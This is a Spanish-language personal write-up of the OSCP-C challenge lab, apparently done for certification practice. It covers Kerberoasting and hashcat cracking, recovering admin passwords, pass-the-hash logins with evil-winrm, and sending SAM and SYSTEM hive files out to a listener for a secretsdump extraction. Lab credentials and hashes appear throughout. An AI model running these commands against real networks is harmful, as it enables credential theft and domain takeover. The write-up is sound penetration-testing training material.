# Challenge: OSCP-C

## Fecha: 26/08/2025
## Objetivo

This is the third of three dedicated OSCP Challenge Labs. It is composed of six OSCP+ machines. The intention of this Challenge is to provide a mock-exam 
experience that closely reflects a similar level of difficulty to that of the actual OSCP+ exam.

The challenge contains three machines that are connected via Active Directory, and another three standalone machines that do not have any dependencies 
or intranet connections. All of the standalone machines have a local.txt and a proof.txt flag, however the Active Directory set only has a proof.txt on the Domain Controller. 
While the Challenge Labs have no point values, on the exam the standalone machines would be worth 20 points each for a total of 60 points. The Active Directory set is worth 40 points all together.

To align with the OSCP+ 'Assumed Breach' scenario for the Active Directory portion of the exam, please use the credentials below for initial access: 

**Username: Eric.Wallows **
**Password: EricLikesRunning800**

All the intended attack vectors for these machines are taught in the PEN-200 Modules, or are leveraged in the PEN-200 Challenge Labs 1-3. 
However, the specific requirements to trigger the vulnerabilities may differ from the exact scenarios and techniques demonstrated in the course material. 
You are expected to be able to take the demonstrated exploitation techniques and modify them for the current environment.

Please feel free to complete this challenge at your own pace. While the OSCP+ exam lasts for 23:45 hours, 
it is designed so that the machines can be successfully attacked in much less time. While each student is different, we highly recommend that you plan 
to spend a significant amount of time resting, eating, hydrating, and sleeping during your exam. 
Thus, we explicitly do not recommend that you attempt to work on this Challenge Lab for 24 hours straight.

We recommend that you begin with a network scan on all the provided IP addresses, and then enumerate each machine based on the results. 
When you are finished with the Challenge, we suggest that you create a mock-exam report for your own records, 
according to the advice provided in the Report Writing for Penetration Testers Module.

Good luck!

## Herramientas
1. Impacket- 
2. tool - 2



## AD-Machines

* nmap sobre **MS02**

```bash
┌──(root㉿kali)-[/home/…/OffSec/Challenges/6_OSCP-C/AD-Machines]
└─# nmap -A 10.10.153.154 -oN MS02-result.txt  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-26 18:50 -03
Nmap scan report for 10.10.153.154
Host is up (0.13s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.10.153.154:1433: 
|     Target_Name: OSCP
|     NetBIOS_Domain_Name: OSCP
|     NetBIOS_Computer_Name: MS02
|     DNS_Domain_Name: oscp.exam
|     DNS_Computer_Name: MS02.oscp.exam
|     DNS_Tree_Name: oscp.exam
|_    Product_Version: 10.0.19041
| ms-sql-info: 
|   10.10.153.154:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false                                                                                                                                                                            
|_    TCP port: 1433                                                                                                                                                                                              
|_ssl-date: 2025-08-26T21:52:11+00:00; 0s from scanner time.                                                                                                                                                      
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback                                                                                                                                                          
| Not valid before: 2025-02-12T22:03:53                                                                                                                                                                           
|_Not valid after:  2055-02-12T22:03:53                                                                                                                                                                           
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                                                                                                              
|_http-title: Not Found                                                                                                                                                                                           
|_http-server-header: Microsoft-HTTPAPI/2.0                                                                                                                                                                       
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port                                                                                                             
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete                                                                                                                                 
No OS matches for host                                                                                                                                                                                            
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows                                                                                                                                                          
                                                                                                                                                                                                                  
Host script results:                                                                                                                                                                                              
| smb2-security-mode:                                                                                                                                                                                             
|   3:1:1:                                                                                                                                                                                                        
|_    Message signing enabled but not required                                                                                                                                                                    
| smb2-time:                                                                                                                                                                                                      
|   date: 2025-08-26T21:51:31                                                                                                                                                                                     
|_  start_date: N/A                                                                                                                                                                                               
|_nbstat: NetBIOS name: MS02, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:86:b4:ec (VMware)                                                                                                                    
                                                                                                                                                                                                                  
TRACEROUTE                                                                                                                                                                                                        
HOP RTT       ADDRESS                                                                                                                                                                                             
1   132.20 ms 10.10.153.154                                                                                                                                                                                       

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.57 seconds
```



* Kerberosting sobre el **DC01** una vez establecido el tunnel ligolo

```bash
┌──(root㉿kali)-[/home/…/OffSec/Challenges/6_OSCP-C/AD-Machines]
└─# impacket-GetUserSPNs -request -dc-ip 10.10.153.152 oscp.exam/Eric.Wallows
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
ServicePrincipalName  Name     MemberOf  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------  --------  --------------------------  --------------------------  ----------
MSSQL/MS02.oscp.exam  sql_svc            2022-12-05 07:30:05.841260  2022-11-10 08:15:51.783016             
HTTP/MS01.oscp.exam   web_svc            2022-11-11 04:11:19.795439  2022-11-14 11:29:47.826775             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*sql_svc$OSCP.EXAM$oscp.exam/sql_svc*$a0dd4a60732a09acedf5bfcf507574e5$e8af2f257bab35a9be802ebe463657c242de0dc0b90c3be39190ab6d1e958207ecf27432ffaf6602153114eed63738ff8afc76445dbd657c5b5c7475e79d73e68fd638b0b616cb03353c1ace8a105c8d69ae250450d67f235c3bf041237f9c5e862d07c422fc5098b9549a790302900db048edb705d75575e6a260e0f7cba0582d2c5cdaebacedf1d0cb6cb23967e64f58304353efd8e53b5d8699995156519951e83b03ff865c361d020363c4ffc7f63267cd26714b992d857db4986b905503e8e55642d6220e6bca10553c3bcdc5d5623c59ad8143c4b8d1fc8ad9b728869bbfe7c34727f308d27bd003b1b44a08ae1ad0be15b6a6578fc0a14167be61830efbd1a1f5963e3bcd72a84e74df30e1d3c22721fe1f9447a7b8059b84982c523d729bc15d0efce53d760811d3713aec00229cfe3eaea363ee928c4797f1378cb6a2084f135734bf6ed9775cdc1347a0607503bf2fe23f245a9a8cfe2a90441654b9f5cb0e80384bf265599eec8c831e7843b6f03b4cfa466114a44301bafe85f6de0b26146f34a022b0cf7de235ec06e552116978c1663560ea5d62f5571c84a19f7471e4e31a738c96e016634625f5698ff66d89c3b88d658729f5f726eb0223cd2a5ac375769496c69b561868c9d44a103e5e9a3255cc946ba5da1ee7ec533c9659b59928fa7f57361c63f2187c15cbaaaec2fdef3506e170ee90bd7f1665050a8bde94be8da5ee916454b4839c0c61cfe4ec0b82aa73ad5a65e58803ba02eac3ec6d4d0d13f3be28007315e106a627ebbd9f7c1e9422ba5fe87a3147be3237c47188d6aee550cce930f8982dc24c4940b41b58f88bb9905894bd62e0f8497976816749e8de55d30ff76e82ce4eecddec9b10132ca66a363805144598c6539482ba896f58599952c14af06fa47039a559fc7555cb888037287c509d7224fd697b78213c0a06a5b05c50ee79193d1409b1f16ad5a11389862ede1c0bd9484a1929a65197aa975341a782a4c947f83e15b031a7e71760879c84d47187de46d380f215edaeef2d10c7aac88e64feb23dd708444a256d4ffd699782d6596f41afd6f499e4c4c23e704cf154598a18520ff8ada33a9d924b4193cda87db1930af70b6bd1574c672adf63b0725a84d9772d3854d31b6f491876e6aa7f7611c9bcc3304c2da4dfa4f661990df764c5be8aa08f87f992229f243c4d7e858630bb141911186b42a33669995b023a1f1eaa9531688c3295ba610ea431b7558ff03f474415d9d35057707d1be86fff8842a8c27ad6e2c131c78ec8b75b20c1559e500a2fba3cfea80dfac268b2102d857ec861db041fcf14cb733f7a55c737cc116cab723bd5e6b916e9b9889b08cde8037f09de9172119fc9c8ce22260d2aa67cd7fe0719e9116c1ab422f35f239e4e2e32a8c4691c8994b2fab6a2a59bee8fdb66bc017dc34e2baad3d9a8ada5d4301cbf00d051fd1ef65b3f0f
$krb5tgs$23$*web_svc$OSCP.EXAM$oscp.exam/web_svc*$930b6763905b875e87dcfcac1ad43f34$65041f670a17252911f190094c3588b5c5f2f61e056b7a21c38f6b26ccf50a49966547a46f751ecd4c8297b015a3a23edcdedee254b0b78f9cda8526d61f8aac1b6ea139d523d396b3f1a556485d163fb445177913358ffce26c1b147a2b6dd32fd6c58984468a6d4a1faa6b5c14cd45bdc54705b5774e72e4e99fa00107f2072a72724d62703409948119e0e4fdfb9cbfe52c94728a5bfeba7c9c1c716938dce5769003dc970f2993bda6beb8dcc18c06e2c157b31fd56762e89c6c7bc532034bb057b1988a8213d7a4b444a31d253810cd724be104a9737733910eaec4a68430e8319cc36586c89ceb3fb6eab0add161419606397829797279788320db2ce5c8a2cfb58e6dce4b50e56993ec7be2426300ad8ee3b1e54d23a2c95e068001f9c06e65a4497116eef2e15bc58270660014a77235d4f3c047e0898ec18c6e822fb9fda1c724ff625f9e1b021cb03e74df3564b48a4402e2e06dc70cec0795826bc3a847b5ced9462fcafd6f405f30f924750b534bfb70bf4995804d3b96215079fca1dbd78b689d6292be597ddaf1ba2bf2c28606eac8fa2ba344c77f5938f1b2a7b1f74d36fbc06c763ee0a39ec651c7fba540dd392c2f265d1d1e0ca1fb7f1746bcbb5b999e9b154f681e4e1d6ed9c98152be9bf352977783e87d7a643b08a8f1b2a37d68c92ce3cc3de3c857cebafa1f6347ce44fc7ff2e54d5cd1c244ef98f11646f808ef12926a9807273fb5c19584d3853de1a9e6e72b1dac283eef547db03cde59349a3a1d95ed841652f1b83daa32e611e6b68e9879adef4b32d11e6c56cb304fc3749d3937507fc49b356616e44f6fc9c50ddb02b68bd886a948a8d5ca7d5d458321a7cd03f61c3156610a9eead127d579cd5bfa92f5e72328e5269f0ce762a650eb62cded5e6daf12dd84d7233d9b52044faae102f987d5357adee3012755bf583c094257a1c806ded91403cd25e0ef246d7ac016bda60d6f4ba1939978117a8642317860021b2020d70c64fe85fdec61db2f4967e506ebf23eb0ea079b3d815b4cbb2fb8f7894e663483c0cd510f6ebf07519702025c963334905a043e8731389ab9b0f8070ab5c4728f0ed23f7a396879ea128767856a7386f92566bd0df0f4777633bd7a1a7af3a3f15af82c1a620a120ec373af4bfa1f4b02b26d7e22339d88929a7cc7d0b4489f0ec28518a74c3d6e11da1dadeb8783369214db6ec2ccbde05f7325155cf216ee027e6155c38eedc32f52a042dddd7ca9663b6b3143d22a26dbda9b803b7d73409f563f00d4d238b7265f705fff06021e23342c7f1be2bc6891e95353954a7f7f14c881d8a26b08163d0beef65fbc3dfc0cecd423e6031e14c3563d545fcc9185972219022fcd76410261e7dc46d7332c4c0d5c9a31aea957738b4a93cb1787f09cd180e4dbd64892dde0d5fd89f0737949fa1a03e12a705a485990ab83285f7cd0eac866500bbec3

```

* Guardamos los hashes en **hashes.kerberoast** y crakeamos

```bash
┌──(root㉿kali)-[/home/…/OffSec/Challenges/6_OSCP-C/AD-Machines]
└─# hashcat -h | grep -i "kerberos"                                                   
  19600 | Kerberos 5, etype 17, TGS-REP                              | Network Protocol
  19800 | Kerberos 5, etype 17, Pre-Auth                             | Network Protocol
  28800 | Kerberos 5, etype 17, DB                                   | Network Protocol
  19700 | Kerberos 5, etype 18, TGS-REP                              | Network Protocol
  19900 | Kerberos 5, etype 18, Pre-Auth                             | Network Protocol
  28900 | Kerberos 5, etype 18, DB                                   | Network Protocol
   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth                      | Network Protocol
  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol
  18200 | Kerberos 5, etype 23, AS-REP  

┌──(root㉿kali)-[/home/…/OffSec/Challenges/6_OSCP-C/AD-Machines]
└─# hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
hashcat (v6.2.6) starting

...

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 1104517645

$krb5tgs$23$*web_svc$OSCP.EXAM$oscp.exam/web_svc*$930b6763905b875e87dcfcac1ad43f34$65041f670a17252911f190094c3588b5c5f2f61e056b7a21c38f6b26ccf50a49966547a46f751ecd4c8297b015a3a23edcdedee254b0b78f9cda8526d61f8aac1b6ea139d523d396b3f1a556485d163fb445177913358ffce26c1b147a2b6dd32fd6c58984468a6d4a1faa6b5c14cd45bdc54705b5774e72e4e99fa00107f2072a72724d62703409948119e0e4fdfb9cbfe52c94728a5bfeba7c9c1c716938dce5769003dc970f2993bda6beb8dcc18c06e2c157b31fd56762e89c6c7bc532034bb057b1988a8213d7a4b444a31d253810cd724be104a9737733910eaec4a68430e8319cc36586c89ceb3fb6eab0add161419606397829797279788320db2ce5c8a2cfb58e6dce4b50e56993ec7be2426300ad8ee3b1e54d23a2c95e068001f9c06e65a4497116eef2e15bc58270660014a77235d4f3c047e0898ec18c6e822fb9fda1c724ff625f9e1b021cb03e74df3564b48a4402e2e06dc70cec0795826bc3a847b5ced9462fcafd6f405f30f924750b534bfb70bf4995804d3b96215079fca1dbd78b689d6292be597ddaf1ba2bf2c28606eac8fa2ba344c77f5938f1b2a7b1f74d36fbc06c763ee0a39ec651c7fba540dd392c2f265d1d1e0ca1fb7f1746bcbb5b999e9b154f681e4e1d6ed9c98152be9bf352977783e87d7a643b08a8f1b2a37d68c92ce3cc3de3c857cebafa1f6347ce44fc7ff2e54d5cd1c244ef98f11646f808ef12926a9807273fb5c19584d3853de1a9e6e72b1dac283eef547db03cde59349a3a1d95ed841652f1b83daa32e611e6b68e9879adef4b32d11e6c56cb304fc3749d3937507fc49b356616e44f6fc9c50ddb02b68bd886a948a8d5ca7d5d458321a7cd03f61c3156610a9eead127d579cd5bfa92f5e72328e5269f0ce762a650eb62cded5e6daf12dd84d7233d9b52044faae102f987d5357adee3012755bf583c094257a1c806ded91403cd25e0ef246d7ac016bda60d6f4ba1939978117a8642317860021b2020d70c64fe85fdec61db2f4967e506ebf23eb0ea079b3d815b4cbb2fb8f7894e663483c0cd510f6ebf07519702025c963334905a043e8731389ab9b0f8070ab5c4728f0ed23f7a396879ea128767856a7386f92566bd0df0f4777633bd7a1a7af3a3f15af82c1a620a120ec373af4bfa1f4b02b26d7e22339d88929a7cc7d0b4489f0ec28518a74c3d6e11da1dadeb8783369214db6ec2ccbde05f7325155cf216ee027e6155c38eedc32f52a042dddd7ca9663b6b3143d22a26dbda9b803b7d73409f563f00d4d238b7265f705fff06021e23342c7f1be2bc6891e95353954a7f7f14c881d8a26b08163d0beef65fbc3dfc0cecd423e6031e14c3563d545fcc9185972219022fcd76410261e7dc46d7332c4c0d5c9a31aea957738b4a93cb1787f09cd180e4dbd64892dde0d5fd89f0737949fa1a03e12a705a485990ab83285f7cd0eac866500bbec3:Diamond1
Cracking performance lower than expected?                 

...                                                                                                 

```

* Password **web_svc**: **Daimond1**

> Por ahora nada util surge de estas credenciales continuamos con la enumeracion en **MS01**

* Encontramos un archivo

```powershell
PS C:\Users\eric.wallows> dir                                                                                                                                                                                     
dir                                                                                                                                                                                                               
                                                                                                                                                                                                                  
                                                                                                                                                                                                                  
    Directory: C:\Users\eric.wallows                                                                                                                                                                              
                                                                                                                                                                                                                  
                                                                                                                                                                                                                  
Mode                 LastWriteTime         Length Name                                                                                                                                                            
----                 -------------         ------ ----                                                                                                                                                            
d-r---         12/7/2019   1:14 AM                Desktop                                                                                                                                                         
d-r---         8/26/2025   2:47 PM                Documents                                                                                                                                                       
d-r---         12/7/2019   1:14 AM                Downloads                                                                                                                                                       
d-r---         12/7/2019   1:14 AM                Favorites                                                                                                                                                       
d-r---         12/7/2019   1:14 AM                Links                                                                                                                                                           
d-r---         12/7/2019   1:14 AM                Music                                                                                                                                                           
d-r---         12/7/2019   1:14 AM                Pictures                                                                                                                                                        
d-----         12/7/2019   1:14 AM                Saved Games                                                                                                                                                     
d-r---         12/7/2019   1:14 AM                Videos                                                                                                                                                          
-a----        11/21/2022   4:49 AM        6102702 admintool.exe                                                                                                                                                   
                                                                                                                                                                                                                  
                                                                                                                                                                                                                  
PS C:\Users\eric.wallows>
```

* Intentamos ejecutarlo

```powershell
PS C:\Users\eric.wallows> .\admintool --help                                                                                                                                                                      
.\admintool --help                                                                                                                                                                                                
admintool 

USAGE:
    admintool.exe <CMD>

ARGS:
    <CMD>    

OPTIONS:
    -h, --help    Print help information
PS C:\Users\eric.wallows> 
```

* Introducimos un comando simple para ver el funcionamiento

```powershell
PS C:\Users\eric.wallows> .\admintool whoami
.\admintool whoami
Enter administrator password:

thread 'main' panicked at 'assertion failed: `(left == right)`
  left: `"d41d8cd98f00b204e9800998ecf8427e"`,
 right: `"05f8ba9f047f799adbea95a16de2ef5d"`: Wrong administrator password!', src/main.rs:78:5
note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace
PS C:\Users\eric.wallows> 
```

* Como no tenemos las credenciales de **administrator** retorna este mensaje en donde nos dice basicamente que espera **right:05f8ba9f047f799adbea95a16de2ef5d**

> Pasamos por un crackstation el hash y obtenemos las credenciaels **05f8ba9f047f799adbea95a16de2ef5d : December31**

Podemos conectarnos con ssh o evil-winrm con las credenciales de administrator

```bash
┌──(root㉿kali)-[/home/…/OffSec/Challenges/6_OSCP-C/AD-Machines]
└─# ssh administrator@192.168.193.153                           
administrator@192.168.193.153's password: December31

Microsoft Windows [Version 10.0.19044.2251]
(c) Microsoft Corporation. All rights reserved.
                                               
administrator@MS01 C:\Users\Administrator>cd ..

administrator@MS01 C:\Users\eric.wallows\Documents>

```

* Elevamos a powershell y obtenemos el historial

```powershell
PS C:\Users\eric.wallows\Documents> (Get-PSReadlineOption).HistorySavePath
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
PS C:\Users\eric.wallows\Documents> type C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
C:\users\support\admintool.exe hghgib6vHT3bVWf cmd
C:\users\support\admintool.exe cmd
shutdown /r /t 7
```
Parece ser otra credencial: **hghgib6vHT3bVWf**

> A pesar de propagar las credenciales con nxc obtenemos falsos negativos porque al intentar manualmente

```bash
┌──(root㉿kali)-[/home/…/OffSec/Challenges/6_OSCP-C/AD-Machines]
└─# evil-winrm -i 10.10.153.154 -u 'administrator' -p 'hghgib6vHT3bVWf' -P 5985  
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
ms02\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> 

```
> Entramos en **MS02**. Objetivo obtener credenciales de sql_svc y tom_admin

```powershell
*Evil-WinRM* PS C:\> dir


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         12/7/2019   1:14 AM                PerfLogs
d-r---        12/20/2022   5:30 AM                Program Files
d-r---        11/10/2022   2:52 AM                Program Files (x86)
d-r---        11/14/2022   6:32 AM                Users
d-----        12/20/2022   5:31 AM                Windows
d-----          4/4/2022   6:00 AM                windows.old
-a----         8/26/2025  10:38 AM           2693 output.txt


*Evil-WinRM* PS C:\>
```

* Obtenemos SYSTEM y SAM como en las maquinas anteriores

1. Configuramos dos listeners para subir nuestros scripts y descargar archivos desde 10.10.xxx.153

```bash
listener_add --addr 10.10.153.153:9001 --to 192.168.45.152:9001 --tcp
listener_add --addr 10.10.153.153:4446 --to 192.168.45.152:4446 --tcp
```


2. Ejecutamos 
```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> iwr -uri http://10.10.153.153:9001/tools.zip -Outfile tools.zip 
*Evil-WinRM* PS C:\Users\Administrator\Documents> Expand-Archive tools.zip -DestinationPath .
*Evil-WinRM* PS C:\Users\Administrator\Documents> dir


    Directory: C:\Users\Administrator\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        11/10/2022   2:54 AM                Visual Studio 2017
-a----         8/15/2025   4:48 PM        6694400 agent.exe
-a----         8/16/2025   7:40 PM           2302 Executor.ps1
-a----         5/19/2025  11:07 PM          39496 Invoke-SessionGopher.ps1
-a----         8/19/2025   9:51 AM        7996928 kerbrute_windows_amd64.exe
-a----         8/16/2025   8:07 PM       10136093 LaZagne.exe
-a----         5/19/2025  11:04 PM        1355264 mimikatz.exe
-a----         5/19/2025  11:57 PM          59392 nc.exe
-a----         8/17/2025  12:31 AM         600580 PowerUp.ps1
-a----         5/19/2025  11:03 PM         770279 PowerView.ps1
-a----         5/20/2025   9:16 AM          27136 PrintSpoofer64.exe
-a----         8/18/2025   4:18 PM         446976 Rubeus.exe
-a----          7/4/2025   3:15 PM           1218 Send-FileToLootSerer.ps1
-a----          7/4/2025   1:21 PM        1580041 SharpHound.ps1
-a----         8/17/2025   9:09 PM         158720 SpoolSample.exe
-a----         8/26/2025   8:28 PM       25966101 tools.zip
-a----         8/16/2025  11:02 AM       10144256 winPEASx64.exe


*Evil-WinRM* PS C:\Users\Administrator\Documents> .\Send-FileToLootSerer.ps1 -FilePath "C:\windows.old\Windows\System32\SAM" -URL "http://10.10.153.153:4446"


StatusCode        : 200
StatusDescription : OK
Content           : {70, 105, 108, 101...}
RawContent        : HTTP/1.0 200 OK
                    Date: Wed, 27 Aug 2025 03:33:06 GMT
                    Server: BaseHTTP/0.6 Python/3.13.5

                    File received.
Headers           : {[Date, Wed, 27 Aug 2025 03:33:06 GMT], [Server, BaseHTTP/0.6 Python/3.13.5]}
RawContentLength  : 14

Archivo enviado exitosamente: SAM


*Evil-WinRM* PS C:\Users\Administrator\Documents> .\Send-FileToLootSerer.ps1 -FilePath "C:\windows.old\Windows\System32\SYSTEM" -URL "http://10.10.153.153:4446"


StatusCode        : 200
StatusDescription : OK
Content           : {70, 105, 108, 101...}
RawContent        : HTTP/1.0 200 OK
                    Date: Wed, 27 Aug 2025 03:33:48 GMT
                    Server: BaseHTTP/0.6 Python/3.13.5

                    File received.
Headers           : {[Date, Wed, 27 Aug 2025 03:33:48 GMT], [Server, BaseHTTP/0.6 Python/3.13.5]}
RawContentLength  : 14

Archivo enviado exitosamente: SYSTEM


*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

* Obtenemos el flag:

```bash
┌──(root㉿kali)-[/home/…/OffSec/Challenges/6_OSCP-C/AD-Machines]
└─# impacket-secretsdump -sam SAM -system SYSTEM LOCAL                       
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x8bca2f7ad576c856d79b7111806b533d
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:acbb9b77c62fdd8fe5976148a933177a:::
tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc:::
Cheyanne.Adams:1002:aad3b435b51404eeaad3b435b51404ee:b3930e99899cb55b4aefef9a7021ffd0:::
David.Rhys:1003:aad3b435b51404eeaad3b435b51404ee:9ac088de348444c71dba2dca92127c11:::
Mark.Chetty:1004:aad3b435b51404eeaad3b435b51404ee:92903f280e5c5f3cab018bd91b94c771:::
[*] Cleaning up... 
                                                                                                                                                                                                                  
┌──(root㉿kali)-[/home/…/OffSec/Challenges/6_OSCP-C/AD-Machines]
└─# evil-winrm -i 10.10.153.152 -u 'tom_admin' -H 4979d69d4ca66955c075c41cf45f24dc -P 5985
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\tom_admin\Documents> Get-ChildItem -Path C:\Users -Include *.txt -File -Recurse -ErrorAction SilentlyContinue


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        8/26/2025  10:37 AM             34 proof.txt


*Evil-WinRM* PS C:\Users\tom_admin> type C:\Users\Administrator\Desktop\proof.txt
952278b109edec1ff2bdf42c6b6946fb
*Evil-WinRM* PS C:\Users\tom_admin> 
```

## Frankfurt

#### 1. Enumeracion Inicial

* Nmap
```bash
Nmap scan report for 192.168.193.156
Host is up (0.16s latency).
Not shown: 984 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
|_ssl-date: TLS randomness does not represent time
22/tcp   open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7e:62:fd:92:52:6f:64:b1:34:48:8d:1e:52:f1:74:c6 (RSA)
|   256 1b:f7:0c:c7:1b:05:12:a9:c5:c5:78:b7:2a:54:d2:83 (ECDSA)
|_  256 ee:d4:a1:1a:07:b4:9f:d9:e5:2d:f6:b8:8d:dd:bf:d7 (ED25519)
25/tcp   open  smtp     Exim smtpd 4.90_1
| smtp-commands: oscp.exam Hello nmap.scanme.org [192.168.45.152], SIZE 52428800, 8BITMIME, PIPELINING, AUTH PLAIN LOGIN, CHUNKING, STARTTLS, HELP
|_ Commands supported: AUTH STARTTLS HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
|_ssl-date: 2025-08-26T18:00:25+00:00; -27s from scanner time.
53/tcp   open  domain   ISC BIND 9.11.3-1ubuntu1.18 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.18-Ubuntu
80/tcp   open  http     nginx
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: oscp.exam &mdash; Coming Soon
110/tcp  open  pop3     Dovecot pop3d
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: RESP-CODES USER TOP AUTH-RESP-CODE UIDL SASL(PLAIN LOGIN) CAPA PIPELINING STLS
143/tcp  open  imap     Dovecot imapd (Ubuntu)
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: Pre-login have post-login capabilities OK STARTTLS LOGIN-REFERRALS ID IDLE more SASL-IR AUTH=LOGINA0001 LITERAL+ ENABLE AUTH=PLAIN IMAP4rev1 listed
465/tcp  open  ssl/smtp Exim smtpd 4.90_1
| smtp-commands: oscp.exam Hello nmap.scanme.org [192.168.45.152], SIZE 52428800, 8BITMIME, PIPELINING, AUTH PLAIN LOGIN, CHUNKING, HELP
|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
|_ssl-date: 2025-08-26T18:01:53+00:00; +1m03s from scanner time.
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
